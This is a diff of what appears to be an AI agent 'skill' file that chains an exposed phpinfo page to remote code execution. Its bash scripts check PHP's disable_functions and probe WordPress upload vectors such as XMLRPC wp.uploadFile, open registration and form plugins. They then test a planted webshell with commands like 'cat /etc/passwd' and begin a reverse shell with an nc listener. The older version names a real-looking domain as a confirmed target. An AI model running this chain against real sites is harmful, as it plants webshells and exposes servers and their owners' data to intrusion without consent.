@@ -1,26 +1,24 @@
 ---
 name: phpinfo-to-rce
 description: Chain phpinfo to RCE via exec check when info.php exposed.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, phpinfo, RCE, wordpress, chain]
-    category: recon
-    related_skills:
-      - source-leak-hunt
-      - xmlrpc-exploitation
-      - wordpress-full-compromise
-      - cross-attack-chains
-      - error-log-mining
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, phpinfo, RCE, wordpress, chain]
+category: recon
+related_skills:
+  - source-leak-hunt
+  - xmlrpc-exploitation
+  - wordpress-full-compromise
+  - cross-attack-chains
+  - error-log-mining
 ---
 
 # PHPInfo → RCE Chain Skill
 
-Exploit chain that starts with an exposed `info.php`/`phpinfo.php` and escalates to remote code execution. When phpinfo reveals that `disable_functions` does NOT block exec functions (`exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`), the target is 1 upload away from full RCE. Confirmed on wines.com (PHP 7.3.29, all exec functions available).
+Exploit chain that starts with an exposed `info.php`/`phpinfo.php` and escalates to remote code execution. When phpinfo reveals that `disable_functions` does NOT block exec functions (`exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`), the target is 1 upload away from full RCE. Confirmed on ecommerce.example.com (PHP 7.3.29, all exec functions available).
 
 ## When to Use
 
@@ -31,7 +29,7 @@ Exploit chain that starts with an exposed `info.php`/`phpinfo.php` and escalates
 
 ## Prerequisites
 
-- `terminal` tool with curl.
+- `terminal` with curl.
 - Confirmed exposed phpinfo page (HTTP 200, contains "PHP Version").
 - For RCE: a file upload vector on the same host (XMLRPC with credentials, open registration, contact form, etc.).
 
@@ -39,7 +37,7 @@ Exploit chain that starts with an exposed `info.php`/`phpinfo.php` and escalates
 
 ```bash
 # Step 1: Fetch phpinfo and check for exec restrictions
-curl -sk "https://TARGET/info.php" | grep -i "disable_functions"
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/info.php" | grep -i "disable_functions"
 
 # Step 2: If ONLY pcntl_* is disabled, all exec functions are available
 # Step 3: Find upload vector and deliver webshell
@@ -68,8 +66,8 @@ curl -sk "https://TARGET/info.php" | grep -i "disable_functions"
 TARGET="$1"
 
 # Full phpinfo dump
-curl -sk --max-time 15 "https://$TARGET/info.php" > /tmp/phpinfo_$TARGET.html
-curl -sk --max-time 15 "https://$TARGET/phpinfo.php" >> /tmp/phpinfo_$TARGET.html 2>/dev/null
+curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/info.php" > /tmp/phpinfo_$TARGET.html
+curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/phpinfo.php" >> /tmp/phpinfo_$TARGET.html 2>/dev/null
 
 # Check if phpinfo is real (not SPA catch-all)
 if ! grep -q "PHP Version" /tmp/phpinfo_$TARGET.html; then
@@ -82,11 +80,11 @@ echo ""
 
 # Extract critical directives
 echo "=== PHP Version ==="
-grep -oP 'PHP Version <.*?>[^<]+' /tmp/phpinfo_$TARGET.html | head -1
+grep -Eo 'PHP Version <.*?>[^<]+' /tmp/phpinfo_$TARGET.html | head -1
 
 echo ""
 echo "=== disable_functions ==="
-DISABLED=$(grep -A1 'disable_functions' /tmp/phpinfo_$TARGET.html | grep -oP '>(local|master).*?<' | sed 's/[<>]//g')
+DISABLED=$(grep -A1 'disable_functions' /tmp/phpinfo_$TARGET.html | grep -Eo '>(local|master).*?<' | sed 's/[<>]//g')
 echo "$DISABLED"
 
 echo ""
@@ -134,26 +132,26 @@ TARGET="$1"
 echo "[*] Searching for upload vectors on $TARGET..."
 
 # Check WordPress open registration
-REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
+REG=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
 [[ -n "$REG" ]] && echo "[+] Open WP registration — can upload via XMLRPC wp.uploadFile"
 
 # Check XMLRPC with wp.uploadFile
-XMLRPC_METHODS=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+XMLRPC_METHODS=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
   | grep -o 'wp.uploadFile')
 [[ -n "$XMLRPC_METHODS" ]] && echo "[+] XMLRPC wp.uploadFile available"
 
 # Check for contact form file upload
-curl -sk "https://$TARGET/contact" | grep -iE 'type=.file|enctype=.multipart' && \
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/contact" | grep -iE 'type=.file|enctype=.multipart' && \
   echo "[+] Contact form with file upload"
 
 # Check Elementor upload (if plugin present)
-curl -sk "https://$TARGET/wp-json/elementor/v1/globals" | grep -q "elementor" && \
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/elementor/v1/globals" | grep -q "elementor" && \
   echo "[+] Elementor detected — check for upload endpoints"
 
 # Check Gravity Forms
-curl -sk "https://$TARGET/wp-json/gf/v2/forms" | grep -q "id" && \
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" | grep -q "id" && \
   echo "[+] Gravity Forms detected — check for file upload fields"
 ```
 
@@ -189,9 +187,9 @@ TARGET="$1"
 WEBSHELL_URL="$2"  # e.g., https://TARGET/wp-content/uploads/2026/06/ws.php
 
 # Test command execution
-curl -sk "$WEBSHELL_URL?c=id"
-curl -sk "$WEBSHELL_URL?c=uname -a"
-curl -sk "$WEBSHELL_URL?c=cat /etc/passwd | head -5"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=id"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=uname -a"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=cat /etc/passwd | head -5"
 
 # Establish reverse shell (if outbound connections allowed)
 # On your listener: nc -lvnp 4444
